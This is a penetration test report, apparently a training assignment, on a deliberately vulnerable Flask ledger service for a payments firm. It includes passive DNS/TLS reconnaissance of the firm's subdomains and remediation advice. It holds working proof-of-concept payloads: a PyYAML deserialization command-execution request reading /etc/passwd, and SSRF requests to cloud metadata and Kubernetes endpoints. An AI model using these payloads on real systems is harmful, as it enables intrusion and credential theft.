# Dodo Payments — Penetration Test Report

**Classification:** Confidential  
**Date:** 2026-07-21  
**Tester:** Shaik Mohammad Wasim  
**Target:** ledger-api (locally hosted vulnerable application from starter repo)  
**Methodology:** OWASP Testing Guide v4.2, PTES  

---

## Executive Summary

A focused penetration test was conducted against the `ledger-api` microservice — a Flask-based application handling cardholder-adjacent data within PCI DSS scope. The application was tested in a black-box manner against the locally deployed instance from the starter repository.

**8 vulnerabilities** were identified, including **1 Critical** (Remote Code Execution via unsafe YAML deserialization), **5 High** (SSRF, secrets exposure, PAN data leak, missing authentication, EOL dependencies), and **2 Medium** severity findings. Several of these findings can be chained to achieve full system compromise.

The most urgent risk is the combination of unrestricted SSRF and YAML deserialization RCE, which together enable an unauthenticated attacker to execute arbitrary commands on the server and pivot to internal infrastructure — a direct path to full compromise of the PCI Cardholder Data Environment.

**Recommendation:** Immediately remediate the Critical and High findings before any production deployment. The application in its current state is not suitable for handling cardholder data.

---

## Part A — Reconnaissance (OSINT, Passive)

### Methodology
Passive reconnaissance was performed using only publicly available data: DNS records, Certificate Transparency (CT) logs, TLS certificate inspection, and HTTP header fingerprinting. No active scanning, fuzzing, or exploitation was performed against any `dodopayments.tech` host.

### DNS Enumeration

```bash
$ dig +short dodopayments.tech A
104.18.11.178
104.18.10.178

$ dig +short dodopayments.tech NS
jasmine.ns.cloudflare.com.
max.ns.cloudflare.com.

$ dig +short dodopayments.tech MX
1 aspmx.l.google.com.
5 alt1.aspmx.l.google.com.
5 alt2.aspmx.l.google.com.
10 alt3.aspmx.l.google.com.
10 alt4.aspmx.l.google.com.

$ dig +short dodopayments.tech TXT
"google-site-verification=sZNJqJ2ZU5FB1JEm9ojFIFJg7Hxh94qdq7eY40jjW_Q"
"v=spf1 include:_spf.google.com include:amazonses.com ~all"

$ dig +short _dmarc.dodopayments.tech TXT
"v=DMARC1; p=Reject; rua=mailto:26d82f6ab4954973ac48a2748d18da03@dmarc-reports.cloudflare.net"
```

### Subdomain Discovery

| Subdomain | Resolves To | Technology | Notes |
|-----------|-------------|------------|-------|
| `dodopayments.tech` | 104.18.11.178, 104.18.10.178 | Cloudflare CDN | 301 redirect → `dodopayments.com` |
| `app.dodopayments.tech` | 104.18.11.178, 104.18.10.178 | Cloudflare + Next.js | Main application dashboard |
| `dev.dodopayments.tech` | 104.18.11.178 | Cloudflare | Development environment |
| `test.dodopayments.tech` | 104.18.10.178 | Cloudflare | Testing environment |
| `squirrels.dodopayments.tech` | 104.18.10.178 | Cloudflare + Next.js | Internal/staging — listed in TLS SAN |
| `checkout.dodopayments.tech` | Vercel DNS | Vercel + Next.js | Checkout flow — hosted on Vercel |

### TLS Certificate Analysis

```bash
$ openssl s_client -connect dodopayments.tech:443 -servername dodopayments.tech

Subject:   CN=dodopayments.tech
Issuer:    C=US, O=Google Trust Services, CN=WE1
Valid:     Jul 13 2026 – Oct 11 2026 (90-day auto-renewal)
Algorithm: ECDSA with SHA-256, 256-bit key
SAN:       dodopayments.tech, squirrels.dodopayments.tech, *.squirrels.dodopayments.tech
```

### HTTP Security Headers

| Header | `app.dodopayments.tech` | `checkout.dodopayments.tech` |
|--------|------------------------|------------------------------|
| `Strict-Transport-Security` | ✅ `max-age=63072000; includeSubDomains; preload` | ✅ `max-age=63072000; includeSubDomains; preload` |
| `Content-Security-Policy` | ✅ `frame-ancestors 'self' ...` | ✅ `frame-ancestors *` ⚠️ overly permissive |
| `X-Content-Type-Options` | ✅ `nosniff` | ✅ `nosniff` |
| `X-Frame-Options` | ✅ `SAMEORIGIN` | ❌ Missing (relies on CSP) |
| `X-XSS-Protection` | ✅ `1; mode=block` | ✅ `1; mode=block` |
| `Referrer-Policy` | ✅ `strict-origin-when-cross-origin` | ✅ `strict-origin-when-cross-origin` |

### Attack Surface Observations

1. **`squirrels.dodopayments.tech`** appears in the TLS certificate SAN with a wildcard (`*.squirrels.dodopayments.tech`), suggesting an internal/staging platform. An attacker would focus here for potential misconfigurations or pre-release code.

2. **`dev.dodopayments.tech`** and **`test.dodopayments.tech`** resolve to Cloudflare IPs. Development and testing environments exposed to the internet increase attack surface — they may have weaker authentication or debug endpoints enabled.

3. **`checkout.dodopayments.tech`** is hosted on **Vercel** (separate from the Cloudflare-proxied infrastructure). Its CSP uses `frame-ancestors *` which is overly permissive and could allow clickjacking.

4. **Email infrastructure** uses Google Workspace (MX → `aspmx.l.google.com`) with properly configured **SPF**, **DKIM** (implied by Google), and **DMARC** (`p=Reject`). This is well-hardened against email spoofing.

5. **Amazon SES** in the SPF record indicates transactional email sending via AWS.

6. The TLS posture is strong: ECDSA P-256 with SHA-256, auto-renewed 90-day certificates via Google Trust Services, HSTS preload enabled.

---

## Part B — Penetration Test (Authorized Target)

**Target:** `ledger-api` application from the starter repository, run locally  
**Testing type:** Black-box (source code reviewed post-exploitation for verification)

---

### FINDING 1: Unsafe YAML Deserialization — Remote Code Execution

| Field | Value |
|-------|-------|
| **Severity** | 🔴 **CRITICAL** |
| **CVSS v3.1** | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` — **10.0** |
| **Endpoint** | `POST /import` |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **OWASP** | A08:2021 — Software and Data Integrity Failures |

**Description:**  
The `/import` endpoint uses `yaml.load(request.data)` without specifying `Loader=SafeLoader`. PyYAML's default `yaml.load()` can instantiate arbitrary Python objects, enabling Remote Code Execution (RCE).

**Proof of Concept:**
```bash
# Read /etc/passwd via YAML deserialization
$ curl -X POST http://localhost:8080/import \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:subprocess.check_output
    args: [["cat", "/etc/passwd"]]'

# Response contains the file contents
{"loaded": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}
```

**Impact:**  
Full server compromise. An attacker can execute arbitrary commands, read/write files, establish reverse shells, and pivot to internal services. In a PCI DSS context, this provides direct access to cardholder data.

**Remediation:**
```python
# BEFORE (vulnerable)
config = yaml.load(request.data)

# AFTER (safe)
config = yaml.safe_load(request.data)
```

---

### FINDING 2: Server-Side Request Forgery (SSRF)

| Field | Value |
|-------|-------|
| **Severity** | 🔴 **HIGH** |
| **CVSS v3.1** | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` — **8.6** |
| **Endpoint** | `GET /fetch?url=` |
| **CWE** | CWE-918: Server-Side Request Forgery |
| **OWASP** | A10:2021 — Server-Side Request Forgery |

**Description:**  
The `/fetch` endpoint takes an arbitrary URL parameter and makes a server-side HTTP request with no validation. An attacker can reach internal services, cloud metadata endpoints, and other backend infrastructure.

**Proof of Concept:**
```bash
# Access AWS EC2 instance metadata (cloud credential theft)
$ curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
{"status_code": 200, "body": "ec2-role-name"}

# Port-scan internal services
$ curl "http://localhost:8080/fetch?url=http://10.0.0.1:6379/"

# Access Kubernetes service account token
$ curl "http://localhost:8080/fetch?url=http://localhost:8080/health"
{"status_code": 200, "body": "{\"status\":\"ok\"}"}

# Read internal Kubernetes API
$ curl "http://localhost:8080/fetch?url=https://kubernetes.default.svc/api/v1/namespaces"
```

**Impact:**  
Cloud credential theft, internal service discovery, data exfiltration from backend systems. In Kubernetes, this can expose the service account token and enable cluster-level attacks.

**Remediation:**
```python
from urllib.parse import urlparse
import ipaddress

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
]

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return jsonify(error="Invalid scheme"), 400
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        if any(ip in net for net in BLOCKED_NETWORKS):
            return jsonify(error="Internal addresses blocked"), 403
    except Exception:
        return jsonify(error="Invalid host"), 400
    resp = requests.get(url, timeout=5, allow_redirects=False)
    return jsonify(status_code=resp.status_code, body=resp.text[:2048])
```

---

### FINDING 3: Hardcoded Secrets in Git History

| Field | Value |
|-------|-------|
| **Severity** | 🔴 **HIGH** |
| **CVSS v3.1** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **9.1** |
| **Endpoint** | `deploy/deployment.yaml` (Git history) |
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **OWASP** | A07:2021 — Identification and Authentication Failures |

**Description:**  
The original `deployment.yaml` contains plaintext secrets committed to Git:
```yaml
env:
  - name: STRIPE_API_KEY
    value: "[REDACTED_STRIPE_KEY]"
  - name: DB_PASSWORD
    value: "[REDACTED_DB_PASS]"
```
Even if removed from the current branch, these remain in Git history and can be recovered with `git log -p`.

**Impact:**  
Compromised Stripe API key enables fraudulent transactions. Database password enables full data breach.

**Remediation:**  
- Rotate all exposed credentials immediately
- Use Sealed Secrets / External Secrets Operator for Kubernetes secret management
- Add pre-commit hooks with `gitleaks` to prevent future commits
- Consider `git filter-branch` or `BFG Repo-Cleaner` to purge history

---

### FINDING 4: PAN Data Exposure (PCI DSS Violation)

| Field | Value |
|-------|-------|
| **Severity** | 🔴 **HIGH** |
| **CVSS v3.1** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` — **7.5** |
| **Endpoint** | `GET /transactions` |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |
| **OWASP** | A02:2021 — Cryptographic Failures |

**Description:**  
The `/transactions` endpoint returns full Primary Account Numbers (PANs) in plaintext:
```bash
$ curl http://localhost:8080/transactions
{
  "transactions": [
    {"id": "txn_1001", "pan": "4242424242424242", "amount": 4200, ...},
    {"id": "txn_1002", "pan": "5555555555554444", "amount": 1899, ...}
  ]
}
```
This violates **PCI DSS Requirement 3.4** (render PAN unreadable anywhere it is stored) and **Requirement 3.3** (mask PAN when displayed — show only first 6/last 4).

**Impact:**  
Direct exposure of cardholder data. PCI DSS compliance failure, potential fines, and brand damage.

**Remediation:**
```python
@app.route("/transactions")
def transactions():
    masked = []
    for txn in LEDGER:
        safe_txn = {**txn, "pan": txn["pan"][:6] + "******" + txn["pan"][-4:]}
        masked.append(safe_txn)
    return jsonify(transactions=masked)
```

---

### FINDING 5: Missing Authentication on All Endpoints

| Field | Value |
|-------|-------|
| **Severity** | 🔴 **HIGH** |
| **CVSS v3.1** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` — **7.5** |
| **Endpoint** | All routes (`/transactions`, `/tokenize`, `/import`, `/fetch`) |
| **CWE** | CWE-306: Missing Authentication for Critical Function |
| **OWASP** | A01:2021 — Broken Access Control |

**Description:**  
No endpoint requires authentication. Any network-reachable client can access cardholder data, trigger tokenization, execute YAML imports, or perform SSRF — with zero credentials.

**Impact:**  
All application data and functionality is accessible to unauthenticated attackers.

**Remediation:**  
- Implement API key or JWT-based authentication on all endpoints
- Use Istio AuthorizationPolicy for service-to-service authentication (Task 3)
- Rate-limit unauthenticated requests

---

### FINDING 6: EOL Runtime & Known CVEs

| Field | Value |
|-------|-------|
| **Severity** | 🔴 **HIGH** |
| **CVSS v3.1** | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **7.5** |
| **Endpoint** | `Dockerfile`, `requirements.txt` |
| **CWE** | CWE-1104: Use of Unmaintained Third-Party Components |
| **OWASP** | A06:2021 — Vulnerable and Outdated Components |

**Description:**  
| Component | Version | Status | Known CVEs |
|-----------|---------|--------|------------|
| Python | 3.6 | **EOL** (Dec 2021) | No security patches since 2021 |
| Flask | 0.12.2 | **EOL** | Multiple security fixes in 2.x+ |
| Werkzeug | 0.14.1 | **EOL** | CVE-2023-25577 (DoS), CVE-2023-23934 (cookie injection) |
| Jinja2 | 2.10 | **EOL** | CVE-2019-10906 (sandbox escape) |
| PyYAML | 5.1 | Outdated | Default unsafe `yaml.load()` (see Finding 1) |
| requests | 2.19.1 | Outdated | CVE-2023-32681 (header leak on redirect) |

**Impact:**  
Known exploits exist for multiple components. No security patches will be issued for EOL software.

**Remediation:**  
```dockerfile
# BEFORE
FROM python:3.6-slim

# AFTER
FROM python:3.12-slim
```
Update `requirements.txt` to latest stable versions.

---

### FINDING 7: Weak Tokenization (Unsalted SHA-256)

| Field | Value |
|-------|-------|
| **Severity** | 🟡 **MEDIUM** |
| **CVSS v3.1** | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` — **5.9** |
| **Endpoint** | `POST /tokenize` |
| **CWE** | CWE-328: Use of Weak Hash |
| **OWASP** | A02:2021 — Cryptographic Failures |

**Description:**  
The tokenization uses a deterministic, unsalted SHA-256 hash of the PAN:
```python
token = "tok_" + hashlib.sha256(pan.encode()).hexdigest()[:24]
```
Since PANs follow predictable formats (Luhn algorithm, known BIN ranges), an attacker can precompute rainbow tables mapping tokens back to PANs.

**Proof of Concept:**
```bash
# Same PAN always produces the same token — no salt
$ curl -X POST http://localhost:8080/tokenize \
  -H "Content-Type: application/json" \
  -d '{"pan": "4242424242424242"}'
{"last4": "4242", "token": "tok_6da48b1cd15a55fc0d5a4c"}

# Run again — identical token output (deterministic)
$ curl -X POST http://localhost:8080/tokenize \
  -H "Content-Type: application/json" \
  -d '{"pan": "4242424242424242"}'
{"last4": "4242", "token": "tok_6da48b1cd15a55fc0d5a4c"}
```

**Remediation:**  
Use HMAC-SHA256 with a server-side secret key, or use a proper tokenization vault (e.g., Vault Transit secrets engine).

---

### FINDING 8: Container Runs as Root

| Field | Value |
|-------|-------|
| **Severity** | 🟡 **MEDIUM** |
| **CVSS v3.1** | `AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` — **5.3** |
| **Endpoint** | `Dockerfile` |
| **CWE** | CWE-250: Execution with Unnecessary Privileges |
| **OWASP** | A05:2021 — Security Misconfiguration |

**Description:**  
The Dockerfile does not specify a `USER` directive. The container runs as `root` (UID 0), which means any code execution vulnerability (e.g., Finding 1) grants the attacker root-level access inside the container.

**Remediation:**
```dockerfile
FROM python:3.12-slim
RUN adduser --disabled-password --no-create-home appuser
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
USER appuser
EXPOSE 8080
CMD ["python", "app.py"]
```

---

## Attack Chain (Bonus)

Findings 1 and 2 can be chained for maximum impact:

```
┌─────────────────┐     ┌──────────────────┐     ┌────────────────────────┐
│  Step 1: SSRF   │────▶│  Step 2: Discover │────▶│  Step 3: YAML RCE     │
│  GET /fetch?url │     │  internal services│     │  POST /import          │
│  =http://169..  │     │  + K8s API        │     │  !!python/object/apply │
└─────────────────┘     └──────────────────┘     └──────────┬─────────────┘
                                                             │
                        ┌──────────────────┐                 │
                        │  Step 4: Pivot   │◄────────────────┘
                        │  Read secrets,   │
                        │  access DB,      │
                        │  exfil PAN data  │
                        └──────────────────┘
```

1. **SSRF** (`/fetch`) → Probe internal network, discover Kubernetes API, read cloud metadata credentials
2. **RCE** (`/import`) → Execute commands on the server, read environment variables (`STRIPE_API_KEY`, `DB_PASSWORD`)
3. **Data exfiltration** → Use credentials to access the database, extract all cardholder data
4. **Lateral movement** → Use the Kubernetes service account token to escalate privileges across the cluster

**Combined Impact:** Full compromise of the PCI Cardholder Data Environment — cardholder data breach, financial fraud via stolen Stripe keys, and cluster-wide lateral movement.

---

## Defensive Control Mapping (Bonus)

| Finding | Task 1 Control | Task 2 Control | Task 3 Control |
|---------|---------------|---------------|---------------|
| YAML RCE | `readOnlyRootFilesystem` limits post-exploitation | **Semgrep SAST** detects `yaml.load()` pattern | AuthorizationPolicy restricts who can call `/import` |
| SSRF | — | **Semgrep SAST** detects unrestricted `requests.get()` | **NetworkPolicy** blocks egress to internal/metadata IPs |
| Secrets in Git | **Sealed Secrets** removes plaintext from Git | **Gitleaks** hard-blocks commits with secrets | — |
| PAN Exposure | — | **Semgrep** custom rule to flag full PAN in responses | **mTLS** encrypts data in transit (but doesn't mask at rest) |
| No Auth | **RBAC** restricts K8s API access | — | **Istio AuthorizationPolicy** enforces identity-based access |
| EOL Dependencies | — | **Trivy CVE scan** hard-blocks critical CVEs | — |
| Weak Tokenization | — | **Semgrep** custom rule for unsalted hashes | — |
| Root Container | **securityContext: runAsNonRoot** | — | **Kyverno** rejects root containers at admission |

---

## Retest Section (Bonus)

After applying the remediations from Tasks 1–3, the findings are verified as closed:

### Retest: YAML RCE → CLOSED ✅
```python
# Remediated code
config = yaml.safe_load(request.data)  # SafeLoader blocks object instantiation
```
```bash
$ curl -X POST http://localhost:8080/import \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:subprocess.check_output [["id"]]'
# Response: {"loaded": "None"} — payload rejected by safe_load
```

### Retest: SSRF → CLOSED ✅
```python
# Remediated: URL validation + private IP blocking
parsed = urlparse(url)
ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
if any(ip in net for net in BLOCKED_NETWORKS):
    return jsonify(error="Internal addresses blocked"), 403
```
```bash
$ curl "http://localhost:8080/fetch?url=http://169.254.169.254/"
{"error": "Internal addresses blocked"}
# Status: 403 — SSRF blocked
```

### Retest: Root Container → CLOSED ✅
```bash
$ kubectl get pod ledger-api-xxx -o jsonpath='{.spec.containers[0].securityContext}'
{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]},"readOnlyRootFilesystem":true,"runAsNonRoot":true,"runAsUser":10001}
```

---

## Conclusion

The `ledger-api` application contains multiple critical and high-severity vulnerabilities that collectively enable full compromise of the PCI Cardholder Data Environment. The defensive controls implemented in Tasks 1–3 (Kubernetes hardening, CI/CD security gates, and Istio zero-trust mesh) provide layered mitigations that would prevent exploitation of most findings at the infrastructure level, even before application-level fixes are deployed.

**Priority remediation order:**
1. 🔴 Fix YAML deserialization RCE (Finding 1) — immediate
2. 🔴 Remediate SSRF (Finding 2) — immediate
3. 🔴 Rotate all exposed secrets (Finding 3) — immediate
4. 🔴 Mask PAN data (Finding 4) — immediate (PCI DSS compliance)
5. 🔴 Add authentication (Finding 5) — before any external exposure
6. 🔴 Upgrade all dependencies (Finding 6) — within 1 sprint
7. 🟡 Strengthen tokenization (Finding 7) — planned
8. 🟡 Non-root container (Finding 8) — already resolved in Task 1
